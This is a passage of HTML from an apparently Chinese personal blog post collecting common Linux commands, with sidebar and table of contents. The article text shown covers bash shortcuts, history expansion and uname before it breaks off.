+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">十一月 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">十月 2025</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">八月 2025</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/07/">七月 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">六月 2025</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">五月 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/03/">三月 2025</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">一月 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">十一月 2024</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/08/">八月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">七月 2024</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/06/">六月 2024</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">五月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">四月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">一月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">三月 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">二月 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">四月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">七月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">五月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">四月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">三月 2017</a><span class="archive-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/life/">生活</a>
+              </p>
+              <p class="item-title">
+                <a href="/2025/11/15/生活-活生生的活着/" class="title">男性强身健体的运动</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2025-11-15T03:10:10.000Z" itemprop="datePublished">2025-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2025/10/11/穷人的特征/" class="title">穷人的特征</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2025-10-11T02:05:32.000Z" itemprop="datePublished">2025-10-11</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2025/10/11/如何培养一个优秀的小孩/" class="title">如何培养一个优秀的小孩</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2025-10-11T01:05:32.000Z" itemprop="datePublished">2025-10-11</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/考试/">考试</a>
+              </p>
+              <p class="item-title">
+                <a href="/2025/10/09/考公记录-行测-1-言语理解/" class="title">言语理解</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2025-10-09T03:10:59.000Z" itemprop="datePublished">2025-10-09</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/考试/">考试</a>
+              </p>
+              <p class="item-title">
+                <a href="/2025/10/09/考公记录-行测/" class="title">考试记录</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2025-10-09T03:10:59.000Z" itemprop="datePublished">2025-10-09</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+  <aside class="sidebar sidebar-toc collapse   in  " id="collapseToc" itemscope="" itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">文章目录</h3>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#你可能不知道的个人常用命令"><span class="toc-number">1.</span> <span class="toc-text">你可能不知道的个人常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#特殊符号的应用"><span class="toc-number">2.</span> <span class="toc-text">特殊符号的应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#d"><span class="toc-number">2.1.</span> <span class="toc-text">! -d</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-number">2.2.</span> <span class="toc-text">!$</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">2.3.</span> <span class="toc-text">!!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#从历史记录中使用命令号来运行命令"><span class="toc-number">2.4.</span> <span class="toc-text">从历史记录中使用命令号来运行命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#系统信息"><span class="toc-number">3.</span> <span class="toc-text">系统信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cat-proc-系统信息"><span class="toc-number">3.1.</span> <span class="toc-text">cat /proc 系统信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uname"><span class="toc-number">3.2.</span> <span class="toc-text">uname</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网络"><span class="toc-number">4.</span> <span class="toc-text">网络</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#网络连接-进程端口"><span class="toc-number">4.1.</span> <span class="toc-text">网络连接(进程端口)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ss-socket-statistics"><span class="toc-number">4.1.1.</span> <span class="toc-text">ss - socket statistics</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lsof-list-open-files"><span class="toc-number">4.1.2.</span> <span class="toc-text">lsof - list open files</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网络管理"><span class="toc-number">4.2.</span> <span class="toc-text">网络管理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ip-show-manipulate-routing-devices-policy-routing-and-tunnels"><span class="toc-number">4.2.1.</span> <span class="toc-text">ip - show / manipulate routing, devices, policy routing and tunnels</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ifconfig-configure-a-network-interface"><span class="toc-number">4.2.2.</span> <span class="toc-text">ifconfig - configure a network interface</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dig-DNS-lookup-utility"><span class="toc-number">4.2.3.</span> <span class="toc-text">dig - DNS lookup utility</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网络调试-网络诊断"><span class="toc-number">4.3.</span> <span class="toc-text">网络调试(网络诊断)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wireshark"><span class="toc-number">4.3.1.</span> <span class="toc-text">wireshark</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nc-netcat-Concatenate-and-redirect-sockets"><span class="toc-number">4.3.2.</span> <span class="toc-text">nc - netcat - Concatenate and redirect sockets</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#网络调试"><span class="toc-number">4.3.2.1.</span> <span class="toc-text">网络调试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#数据传输"><span class="toc-number">4.3.2.2.</span> <span class="toc-text">数据传输</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#端口扫描工具"><span class="toc-number">4.3.2.3.</span> <span class="toc-text">端口扫描工具</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#安全工具"><span class="toc-number">4.3.2.4.</span> <span class="toc-text">安全工具</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#端口转发，作为代理"><span class="toc-number">4.3.2.4.1.</span> <span class="toc-text">端口转发，作为代理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#创建后门-也叫反弹shell"><span class="toc-number">4.3.2.4.2.</span> <span class="toc-text">创建后门(也叫反弹shell)</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#监测工具"><span class="toc-number">4.3.2.5.</span> <span class="toc-text">监测工具</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mtr-a-network-diagnostic-tool"><span class="toc-number">4.3.3.</span> <span class="toc-text">mtr - a network diagnostic tool</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网络带宽"><span class="toc-number">4.4.</span> <span class="toc-text">网络带宽</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网络传输-数据"><span class="toc-number">4.5.</span> <span class="toc-text">网络传输(数据)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#scp-secure-copy"><span class="toc-number">4.5.1.</span> <span class="toc-text">scp - secure copy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#命令格式"><span class="toc-number">4.5.1.1.</span> <span class="toc-text">命令格式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#命令功能"><span class="toc-number">4.5.1.2.</span> <span class="toc-text">命令功能</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#命令参数"><span class="toc-number">4.5.1.3.</span> <span class="toc-text">命令参数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用实例"><span class="toc-number">4.5.1.4.</span> <span class="toc-text">使用实例</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#从本地服务器上传到远程服务器"><span class="toc-number">4.5.1.4.1.</span> <span class="toc-text">从本地服务器上传到远程服务器</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#从远程服务器下载到本地服务器"><span class="toc-number">4.5.1.4.2.</span> <span class="toc-text">从远程服务器下载到本地服务器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nc-数据传输"><span class="toc-number">4.5.2.</span> <span class="toc-text">nc - 数据传输</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CPU、内存、硬盘的使用状态"><span class="toc-number">5.</span> <span class="toc-text">CPU、内存、硬盘的使用状态</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cpu使用状态"><span class="toc-number">5.1.</span> <span class="toc-text">cpu使用状态</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#‘iostat-c’-CPU利用情况报告"><span class="toc-number">5.1.1.</span> <span class="toc-text">‘iostat -c’ CPU利用情况报告</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mpstat-Multiprocessor-Statistics"><span class="toc-number">5.1.2.</span> <span class="toc-text">mpstat- Multiprocessor Statistics</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IO"><span class="toc-number">5.2.</span> <span class="toc-text">IO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#iostat-报告CPU统计数据和设备、分片的输入输出统计数据"><span class="toc-number">5.2.1.</span> <span class="toc-text">iostat - 报告CPU统计数据和设备、分片的输入输出统计数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iotop-–-simple-top-like-I-O-monitor"><span class="toc-number">5.2.2.</span> <span class="toc-text">iotop – simple top-like I/O monitor</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内存使用状态"><span class="toc-number">5.3.</span> <span class="toc-text">内存使用状态</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#free-Display-amount-of-free-and-used-memory-in-the-system"><span class="toc-number">5.3.1.</span> <span class="toc-text">free - Display amount of free and used memory in the system</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vmstat-Report-virtual-memory-statistics"><span class="toc-number">5.3.2.</span> <span class="toc-text">vmstat - Report virtual memory statistics</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#proc-meminfo"><span class="toc-number">5.3.3.</span> <span class="toc-text">/proc/meminfo</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#硬-磁-盘使用状态"><span class="toc-number">5.4.</span> <span class="toc-text">硬(磁)盘使用状态</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#df-disk-free"><span class="toc-number">5.4.1.</span> <span class="toc-text">df - disk free</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#du-disk-usage"><span class="toc-number">5.4.2.</span> <span class="toc-text">du - disk usage</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ncdu"><span class="toc-number">5.4.3.</span> <span class="toc-text">ncdu</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iostat：硬盘的输入输出使用状态"><span class="toc-number">5.4.4.</span> <span class="toc-text">iostat：硬盘的输入输出使用状态</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fdisk：磁盘分区表数据"><span class="toc-number">5.4.5.</span> <span class="toc-text">fdisk：磁盘分区表数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文本处理相关"><span class="toc-number">6.</span> <span class="toc-text">文本处理相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#排序与过滤"><span class="toc-number">6.1.</span> <span class="toc-text">排序与过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sort-排序"><span class="toc-number">6.1.1.</span> <span class="toc-text">sort 排序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uniq-过滤"><span class="toc-number">6.1.2.</span> <span class="toc-text">uniq 过滤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#截取与连接"><span class="toc-number">6.2.</span> <span class="toc-text">截取与连接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cut-按列切分文本"><span class="toc-number">6.2.1.</span> <span class="toc-text">cut 按列切分文本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#paste-按列拼接文本"><span class="toc-number">6.2.2.</span> <span class="toc-text">paste 按列拼接文本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#行列操作-重点"><span class="toc-number">6.3.</span> <span class="toc-text">行列操作 - 重点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#awk-列操作"><span class="toc-number">6.3.1.</span> <span class="toc-text">awk - 列操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sed-操作"><span class="toc-number">6.3.2.</span> <span class="toc-text">sed - 操作</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件处理相关"><span class="toc-number">7.</span> <span class="toc-text">文件处理相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#文件内容比较"><span class="toc-number">7.1.</span> <span class="toc-text">文件内容比较</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#diff"><span class="toc-number">7.1.1.</span> <span class="toc-text">diff</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vimdiff-edit-two-three-or-four-versions-of-a-file-with-Vim-and-show-differences"><span class="toc-number">7.1.2.</span> <span class="toc-text">vimdiff - edit two, three or four versions of a file with Vim and show differences</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#服务程序"><span class="toc-number">8.</span> <span class="toc-text">服务程序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#压测"><span class="toc-number">8.1.</span> <span class="toc-text">压测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java"><span class="toc-number">8.2.</span> <span class="toc-text">java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#程序试错检查"><span class="toc-number">8.3.</span> <span class="toc-text">程序试错检查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用命令"><span class="toc-number">9.</span> <span class="toc-text">常用命令</span></a></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-linux常用命令草集" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      linux常用命令草集
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2019/10/23/linux常用命令草集/" class="article-date">
+	  <time datetime="2019-10-23T09:03:26.000Z" itemprop="datePublished">2019-10-23</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/linux/">linux</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/linux/">linux</a>
+  </span>
+
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2019/10/23/linux常用命令草集/#comments" class="article-comment-link">评论</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 5.9k(字)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 26(分)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h2 id="你可能不知道的个人常用命令"><a href="#你可能不知道的个人常用命令" class="headerlink" title="你可能不知道的个人常用命令"></a>你可能不知道的个人常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ctrl u 可以删除行内光标所在位置之前的内容 - 常用</span><br><span class="line">ctrl l 可以清屏 - 常用</span><br><span class="line">ctrl a 可以将光标移至行首</span><br><span class="line">ctrl e 可以将光标移至行尾</span><br><span class="line">ctrl k 可以删除光标至行尾的所有内容</span><br><span class="line">ctrl w 删除你键入的最后一个单词</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> - 回到前一个工作路径</span><br></pre></td></tr></table></figure>
+<h2 id="特殊符号的应用"><a href="#特殊符号的应用" class="headerlink" title="特殊符号的应用"></a>特殊符号的应用</h2><h3 id="d"><a href="#d" class="headerlink" title="! -d"></a>! -d</h3><blockquote>
+<p>检查某个目录是否存在</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">和上面的命令类似。这里是检测目录是否为空，如果为空则退出命令</span><br><span class="line">skyler@bogon  ~/skyler/a [ ! -d /home/<span class="built_in">test</span>/exist ] &amp;&amp; <span class="built_in">exit</span></span><br><span class="line">检测目录是否为空，如果为空则创建该目录</span><br><span class="line">skyler@bogon  ~/skyler/a [ ! -d /home/<span class="built_in">test</span>/exist ] &amp;&amp; mkdir /home/<span class="built_in">test</span>/exist</span><br></pre></td></tr></table></figure>
+<h3 id=""><a href="#" class="headerlink" title="!$"></a>!$</h3><blockquote>
+<p>将上一条命令的参数传递给下一条命令参数</p>
+</blockquote>
+<p>当这个参数特别长的时候此命令特别有用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">skyler@bogon  ~/skyler/a 201910  <span class="built_in">cd</span> /Users/skyler/skyler/a</span><br><span class="line">skyler@bogon  ~/skyler/a 201910  ll !$</span><br><span class="line">skyler@bogon  ~/skyler/a 201910  ll /Users/skyler/skyler/a</span><br><span class="line">total 64</span><br><span class="line">-rw-r--r--  1 skyler  staff   346B  8  8 11:55 Dockerfile</span><br><span class="line">-rw-r--r--  1 skyler  staff   249B  8  9 14:16 README.md</span><br></pre></td></tr></table></figure>
+<h3 id="-1"><a href="#-1" class="headerlink" title="!!"></a>!!</h3><blockquote>
+<p>执行上一条命令</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]<span class="comment"># cat test.sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$#</span> <span class="variable">$0</span> <span class="variable">$1</span></span><br><span class="line">aaa=111</span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]<span class="comment"># !!</span></span><br><span class="line">cat test.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$#</span> <span class="variable">$0</span> <span class="variable">$1</span></span><br><span class="line">aaa=111</span><br></pre></td></tr></table></figure>
+<h3 id="从历史记录中使用命令号来运行命令"><a href="#从历史记录中使用命令号来运行命令" class="headerlink" title="从历史记录中使用命令号来运行命令"></a>从历史记录中使用命令号来运行命令</h3><p>首先输入 “<strong>history</strong>” 命令得到命令的序号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">skyler@bogon  ~/bin <span class="built_in">history</span></span><br><span class="line">10063* [ ! d ~/<span class="built_in">test</span>/exist ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"no"</span></span><br><span class="line">10064* [ diff ~/<span class="built_in">test</span>/exist ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"no"</span></span><br><span class="line">10065* [ ! -d ~/<span class="built_in">test</span>/exist ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"no"</span></span><br><span class="line">10066* [ ! -d ~/bin ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"no"</span></span><br></pre></td></tr></table></figure>
+<p>然后通过每行前的序号结合!来执行此行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">skyler@bogon  ~/bin  !10065</span><br><span class="line">skyler@bogon  ~/bin  [ ! -d ~/<span class="built_in">test</span>/exist ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"no"</span></span><br></pre></td></tr></table></figure>
+<p>还可以使用!-n, n为数字</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">skyler@bogon  ~/bin  !-2</span><br><span class="line">skyler@bogon  ~/bin  [ ! -d ~/<span class="built_in">test</span>/exist ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"no"</span></span><br></pre></td></tr></table></figure>
+<h2 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc</span><br><span class="line">uname</span><br></pre></td></tr></table></figure>
+<h3 id="cat-proc-系统信息"><a href="#cat-proc-系统信息" class="headerlink" title="cat /proc 系统信息"></a>cat /proc 系统信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/&#123;xxx&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="uname"><a href="#uname" class="headerlink" title="uname"></a>uname</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]# uname -a</span><br><span class="line">Linux aizbp11lqlgyf2g31fgs4hg 3.10.0-693.2.2.el7.x86_64 #1 SMP Tue Sep 12 22:26:13 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">查看主机名</span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]# uname -n</span><br><span class="line">aizbp11lqlgyf2g31fgs4hg</span><br><span 